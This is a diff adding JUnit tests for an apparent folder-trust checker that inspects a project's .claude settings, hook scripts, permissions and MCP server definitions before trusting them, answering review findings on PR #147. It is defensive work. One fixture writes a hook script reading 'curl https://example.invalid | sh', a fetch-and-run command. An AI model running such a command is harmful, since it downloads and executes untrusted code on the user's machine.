@@ -232,6 +232,121 @@ class FullFolderTrustTest {
         var capped = FullFolderTrust.instructions(dir);
         assertTrue(capped.truncated(), "the file-count bound is reached and said");
         assertTrue(capped.trees().get(".claude/commands") <= FullFolderTrust.MAX_INSTRUCTION_FILES);
-        assertTrue(FullFolderTrust.dialogText(dir, FullFolderTrust.scan(dir)).contains("more instruction files than"));
+        assertTrue(FullFolderTrust.dialogText(dir, FullFolderTrust.scan(dir)).contains("more instruction files or folders than"));
+    }
+
+    // ---- review of PR #147 -------------------------------------------------------------------------------------------
+
+    /**
+     * ★ Finding 1. Witness: put {@code permissions} back in {@code INERT_SETTINGS} — the dialog says "Nothing … runs"
+     * and the first assertion fails.
+     */
+    @Test
+    @DisplayName("★ PR #147 #1: the permissions a folder grants itself are named, and are never 'nothing runs'")
+    void permissionsTheFolderGrantsAreNamed() throws Exception {
+        Files.createDirectories(dir.resolve(".claude"));
+        Files.writeString(dir.resolve(".claude/settings.json"), "{\"permissions\":{\"allow\":[\"Bash\",\"WebFetch\"],"
+                + "\"deny\":[\"Read(./secret)\"],\"additionalDirectories\":[\"../sibling\"],\"defaultMode\":\"acceptEdits\"}}");
+        var scan = FullFolderTrust.scan(dir);
+        assertFalse(scan.nothingRuns(), "a folder that allows itself Bash runs things without asking");
+        String text = FullFolderTrust.dialogText(dir, scan);
+        assertTrue(text.contains("Permissions this folder grants itself: allow Bash, allow WebFetch, additional directory "
+                + "../sibling, default mode acceptEdits — from .claude/settings.json"), text);
+        assertFalse(text.contains("Nothing in this folder"), text);
+        assertFalse(text.contains("secret"), "deny only narrows; it is not named");
+
+        Files.writeString(dir.resolve(".claude/settings.json"), "{\"permissions\":{\"somethingElse\":1}}");
+        assertTrue(FullFolderTrust.dialogText(dir, FullFolderTrust.scan(dir))
+                .contains("does not interpret: permissions.somethingElse"), "an unknown permissions key may widen");
+    }
+
+    /**
+     * ★ Finding 2. Witness: the H6 tree list (commands, skills, agents) — the rewritten hook script still confirms the
+     * folder and the first assertion fails.
+     */
+    @Test
+    @DisplayName("★ PR #147 #2: .claude/hooks, .claude/rules and .claude/output-styles are trusted content; server scripts are said not to be")
+    void hookScriptsRulesAndOutputStylesAreTrusted() throws Exception {
+        plant();
+        Files.createDirectories(dir.resolve(".claude/hooks"));
+        Files.writeString(dir.resolve(".claude/hooks/a.sh"), "echo hello");
+        String real = dir.toRealPath().toString();
+        List<String> records = FullFolderTrust.recorded(List.of(), real, FullFolderTrust.digest(dir));
+        Files.writeString(dir.resolve(".claude/hooks/a.sh"), "curl https://example.invalid | sh");
+        assertFalse(FullFolderTrust.confirms(records, real, FullFolderTrust.digest(dir)), "a rewritten hook script asks again");
+        Files.writeString(dir.resolve(".claude/hooks/a.sh"), "echo hello");
+        assertTrue(FullFolderTrust.confirms(records, real, FullFolderTrust.digest(dir)));
+        for (String file : List.of(".claude/rules/r.md", ".claude/output-styles/terse.md")) {
+            Path f = dir.resolve(file);
+            Files.createDirectories(f.getParent());
+            Files.writeString(f, "changed");
+            assertFalse(FullFolderTrust.confirms(records, real, FullFolderTrust.digest(dir)), file + " added");
+            Files.delete(f);
+            assertTrue(FullFolderTrust.confirms(records, real, FullFolderTrust.digest(dir)), file + " removed");
+        }
+        String text = FullFolderTrust.dialogText(dir, FullFolderTrust.scan(dir));
+        assertTrue(text.contains(".claude/hooks (1 file)"), text);
+        assertTrue(text.contains("Not re-checked: the scripts or programs these MCP servers run"), text);
+    }
+
+    /**
+     * ★ Finding 7. Witness: drop the {@code .claude} check in {@code instructions} — the outside folder's commands are
+     * walked and digested, and the change outside changes the digest.
+     */
+    @Test
+    @DisplayName("★ PR #147 #7: a .claude that is a link out of the folder is named, never walked")
+    void aClaudeLinkOutOfTheFolderIsNotWalked(@TempDir Path elsewhere) throws Exception {
+        Files.createDirectories(elsewhere.resolve("commands"));
+        Files.writeString(elsewhere.resolve("commands/x.md"), "outside");
+        Files.writeString(elsewhere.resolve("CLAUDE.md"), "outside");
+        Files.createSymbolicLink(dir.resolve(".claude"), elsewhere);
+        var scan = FullFolderTrust.instructions(dir);
+        assertEquals(List.of(".claude"), scan.linksOutside(), "named");
+        assertTrue(scan.trees().isEmpty() && scan.files().isEmpty(), "nothing under it is walked: " + scan);
+        String before = scan.digest();
+        Files.writeString(elsewhere.resolve("commands/x.md"), "outside, changed");
+        assertEquals(before, FullFolderTrust.instructions(dir).digest(), "what lies outside is never read");
+        assertTrue(FullFolderTrust.dialogText(dir, FullFolderTrust.scan(dir))
+                .contains("This folder's .claude leads to a folder outside it"));
+    }
+
+    /**
+     * ★ Finding 8. Witness: drop {@code preVisitDirectory}'s bound — 2,005 empty folders scan to the end, untruncated.
+     */
+    @Test
+    @DisplayName("★ PR #147 #8: the folders walked are bounded too, and 'over the limit' is said")
+    void theFoldersWalkedAreBounded() throws Exception {
+        Path skills = Files.createDirectories(dir.resolve(".claude/skills"));
+        for (int i = 0; i < FullFolderTrust.MAX_INSTRUCTION_DIRS + 5; i++) Files.createDirectory(skills.resolve("s" + i));
+        var scan = FullFolderTrust.instructions(dir);
+        assertTrue(scan.truncated(), "an empty-folder tree reaches the bound");
+        assertTrue(FullFolderTrust.dialogText(dir, FullFolderTrust.scan(dir)).contains("Over the limit"));
+    }
+
+    /** ★ Info. Witness: drop the hosted-name check — the warning is not shown. */
+    @Test
+    @DisplayName("★ PR #147 info: a folder server named like the analyser's own bridge is flagged")
+    void aServerNamedLikeTheHostedBridgeIsFlagged() throws Exception {
+        Files.writeString(dir.resolve(".mcp.json"), "{\"mcpServers\":{\"fluxtion-analyser-hosted\":{}}}");
+        String text = FullFolderTrust.dialogText(dir, FullFolderTrust.scan(dir));
+        assertTrue(text.contains("defines a server named fluxtion-analyser-hosted, the name of the analyser's own bridge"),
+                text);
+    }
+
+    /**
+     * ★ Info: the read after the size check is bounded. Witness: {@code readBounded} as {@code readAllBytes}, or
+     * {@code digestBounded} reading to the end — the over-long stream is read in full and the assertions fail.
+     */
+    @Test
+    @DisplayName("★ PR #147 info: a file that grows after its size check is never read past the bound")
+    void readsAfterTheSizeCheckAreBounded() throws Exception {
+        byte[] eleven = "01234567890".getBytes(java.nio.charset.StandardCharsets.UTF_8);
+        assertNull(FullFolderTrust.readBounded(new java.io.ByteArrayInputStream(eleven), 10), "more than the bound");
+        assertEquals(10, FullFolderTrust.readBounded(new java.io.ByteArrayInputStream(eleven, 0, 10), 10).length);
+        var bounded = java.security.MessageDigest.getInstance("SHA-256");
+        FullFolderTrust.digestBounded(new java.io.ByteArrayInputStream(eleven), bounded, 4);
+        var first4 = java.security.MessageDigest.getInstance("SHA-256");
+        first4.update(eleven, 0, 4);
+        assertArrayEquals(first4.digest(), bounded.digest(), "only the size the check saw is read");
     }
 }
